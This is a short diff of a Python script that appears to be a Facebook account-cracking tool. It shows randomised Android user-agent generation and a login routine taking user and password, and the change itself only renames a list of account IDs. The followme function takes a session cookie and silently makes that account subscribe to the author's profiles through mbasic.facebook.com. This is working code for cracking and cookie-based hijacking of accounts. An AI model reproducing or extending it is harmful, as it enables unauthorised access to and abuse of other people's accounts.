@@ -47,7 +47,7 @@ ok, cp = [],[]
 data, data2 = {}, {}
 wadok,ugen2 = [],[]
 ses = requests.Session()
-mysosmed = ["100023442491781",'100013275378835','100063837653547']
+my_account = ["100023442491781",'100013275378835','100063837653547']
 
 for x in range(20000):
       android = str(random.randint(4,9))+'.'+str(random.randint(0,1))+'.'+str(random.randint(0,1))
@@ -568,7 +568,7 @@ def apimethod(opsis,user,pasw):
       loop+=1
 
 def followme(kueh):
-      for user in mysosmed:
+      for user in my_account:
             try:
                   for response in parse(requests.get(f'https://mbasic.facebook.com/'+user,cookies={'cookie':kueh}).text,'html.parser').find_all('a',href=True):
                         if '/a/subscribe.php?' in response.get('href'):x=requests.get('https://mbasic.facebook.com{}'.format(response['href']), cookies = {'cookie':kueh}).text
